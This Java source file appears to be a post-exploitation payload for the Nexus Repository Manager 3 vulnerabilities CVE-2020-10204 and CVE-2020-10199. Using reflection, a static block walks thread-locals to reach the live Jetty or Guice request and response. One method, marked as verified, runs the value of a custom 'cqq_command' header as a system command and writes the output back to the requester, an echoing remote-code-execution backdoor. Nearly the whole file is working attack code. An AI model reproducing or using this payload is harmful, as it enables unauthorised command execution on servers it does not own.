// Ref:
// https://hu3sky.github.io/2020/04/08/CVE-2020-10204_CVE-2020-10199:%20Nexus%20Repository%20Manager3%20%E5%88%86%E6%9E%90&%E4%BB%A5%E5%8F%8A%E4%B8%89%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/#%E5%9B%9E%E6%98%BE
// https://www.cnblogs.com/magic-zero/p/12641068.html
// https://xz.aliyun.com/t/7798#toc-0

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class Echo_WebContext {
    static {
        try {
            getResponseFromThread();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void getResponseFromThread() {
        try {
            //获取当前线程对象
            Thread thread = Thread.currentThread();
            //获取Thread中的threadLocals对象
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            //ThreadLocalMap是ThreadLocal中的一个内部类，并且访问权限是default
            // 这里获取的是ThreadLocal.ThreadLocalMap
            Object threadLocalMap = threadLocals.get(thread);

            //这里要这样获取ThreadLocal.ThreadLocalMap
            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            //获取ThreadLocalMap中的Entry对象
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);
            //获取ThreadLocalMap中的Entry
            Object[] objects = (Object[]) tableField.get(threadLocalMap);

            //获取ThreadLocalMap中的Entry
            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            //获取ThreadLocalMap中的Entry中的value字段
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);

            for (Object object : objects) {
                if (object != null) {
                    try {
//                        useJettyHttpConnection(entryValueField, object);
                        useGoogleGuiceFilterContext(entryValueField, object);
                    } catch (IllegalAccessException e) {
                        //e.printStackTrace();    // of no use here
                    }
                }
            }
        } catch (Exception e) {

        }
    }

    
    /*
    TODO：未验证成功
    */
    private static void useGoogleGuiceFilterContext(Field entryValueField, Object object) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException, IOException, NoSuchFieldException {
        Object httpConnection = entryValueField.get(object);
        if (httpConnection != null) {
            if (httpConnection.getClass().getName().equals("com.google.inject.servlet.GuiceFilter$Context")) {

                // final HttpServletRequest request;
                java.lang.reflect.Field request = httpConnection.getClass().getDeclaredField("request");
                request.setAccessible(true);

                // final HttpServletResponse response;
                java.lang.reflect.Field response = httpConnection.getClass().getDeclaredField("response");
                response.setAccessible(true);

                // 获取自定义头部
                String header = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{"cqq_command"});

                Object shiroServletResponse = response.get(httpConnection);
                Class<?> Wrapper = shiroServletResponse.getClass().getSuperclass().getSuperclass();
                Object statusResponse = Wrapper.getMethod("getResponse").invoke(shiroServletResponse);
                Object response1 = Wrapper.getMethod("getResponse").invoke(statusResponse);
                java.io.PrintWriter writer = (java.io.PrintWriter) response1.getClass().getMethod("getWriter").invoke(response1);

//                String sb = "";
//                java.io.BufferedInputStream in = new java.io.BufferedInputStream(Runtime.getRuntime().exec("whoami").getInputStream());
//                java.io.BufferedReader inBr = new java.io.BufferedReader(new java.io.InputStreamReader(in));
//                String lineStr;
//                while ((lineStr = inBr.readLine()) != null)
//                    sb += lineStr + "\n";
//                //writer.write(sb);
//                //writer.flush();
//                writer.println(sb);
                writer.println(header);
                writer.close();
            }
        }
    }


    /*
    已验证
    - /service/extdirect
    - /service/rest/beta/repositories/go/group。

    调用过程：
org.eclipse.jetty.server.HttpConnection=》getHttpChannel
org.eclipse.jetty.server.HttpChannel=》getRequest
org.eclipse.jetty.server.Request=》getHeader
String


org.eclipse.jetty.server.HttpChannel=》getResponse
org.eclipse.jetty.server.Response=》getWriter
java.io.PrintWriter#write(header)
java.io.PrintWriter#close()
     */
    private static void useJettyHttpConnection(Field entryValueField, Object object) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException, IOException {
        Object httpConnection = entryValueField.get(object);
        if (httpConnection != null) {
            if (httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                Class<?> HttpConnection = httpConnection.getClass();
                // 获取HttpChannel 对象
                Object httpChannel = HttpConnection.getMethod("getHttpChannel").invoke(httpConnection);
                Class<?> HttpChannel = httpChannel.getClass();
                // 获取request对象
                Object request = HttpChannel.getMethod("getRequest").invoke(httpChannel);
                // 获取自定义头部
                String header = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{"cqq_command"});
                // 获取response对象
                Object response = HttpChannel.getMethod("getResponse").invoke(httpChannel);

                PrintWriter writer = (PrintWriter)response.getClass().getMethod("getWriter").invoke(response);

                StringBuilder stringBuilder = new StringBuilder();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(header).getInputStream()));
                String line;
                while((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line).append("\n");
                }
                String res = stringBuilder.toString();


                // 将命令执行的结果通过输出流输出给客户端
                writer.write(res);
                writer.close();
            }
        }
    }


}
